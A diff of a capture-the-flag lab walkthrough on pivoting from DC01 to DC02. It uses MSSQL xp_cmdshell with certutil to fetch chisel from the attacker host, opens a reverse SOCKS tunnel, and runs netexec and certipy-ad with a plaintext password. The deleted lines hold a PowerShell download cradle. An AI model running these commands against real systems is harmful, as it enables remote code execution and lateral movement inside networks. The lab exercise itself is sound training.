@@ -11,58 +11,53 @@ ping -n 2 172.16.20.1
 
 ![[Screenshot_2026-03-24_11-41-07.png]]
 
-### 2. Set Up a Proxy via DC02 — On Kali
 
-Upload chisel to DC02 for tunneling:
+### 2. Kali: prepare and serve chisel
 
-#Attacking_machine 
+``` bash
+bash# Install chisel
+sudo apt install chisel -y
 
-```bash
-# On Kali — install chisel
-sudo apt install chisel -y 
-which chisel
-
-# Start chisel server on Kali
-./chisel server -p 8000 --reverse
-```
-
-### 3. Upload Chisel to DC02
-
-powershell
-
-```powershell
-# On DC02 shell
-powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.36:8080/chisel.exe','C:\Windows\Temp\chisel.exe')"
-```
-
-Serve it first on Kali:
-
-bash
-
-```bash
+#Serve it
+cp $(which chisel) /tmp/chisel.exe
+cd /tmp
 python3 -m http.server 8080
 ```
 
-### 4. Connect Back from DC02
-
-powershell
-
-```powershell
-C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks
-```
-
-### 5. Route Traffic Through the Tunnel
-
-bash
+### 3. Kali: start chisel server (new terminal)
 
 ```bash
-# Add to /etc/proxychains4.conf
-socks5 127.0.0.1 1080
-
-# Then access DC01 internal IP
-proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
+chisel server -p 8000 --reverse
 ```
 
----
+### 4. DC01 MSSQL session: download chisel to DC02
 
-💡 **This is the pivot point** — DC01 at `172.16.20.1` may have different services exposed internally than what we saw externally. Start the chisel server on Kali and let's tunnel through DC02! 🎯
+```sql
+EXECUTE ('EXEC xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.36:8080/chisel.exe C:\Windows\Temp\chisel.exe''') AT [DC02.darkzero.ext];
+```
+
+### 5. DC01 MSSQL session: run chisel client on DC02
+
+```sql
+EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks''') AT [DC02.darkzero.ext];
+```
+
+### 6. Kali: configure proxychains
+
+```bash
+bash# Add to /etc/proxychains4.conf (last line)
+echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
+```
+
+### 7. Kali: access DC01 internal interface through tunnel
+
+```bash
+proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
+proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -vulnerable -stdout
+```
+
+![[Screenshot_2026-03-27_11-17-18.png]]
+
+🟢 Tunnel is working perfectly! *DC01*'s internal interface is reachable through *DC02*. Now run the full attack through the tunnel:
+
+**Next step:** [[ADCS enumeration]]
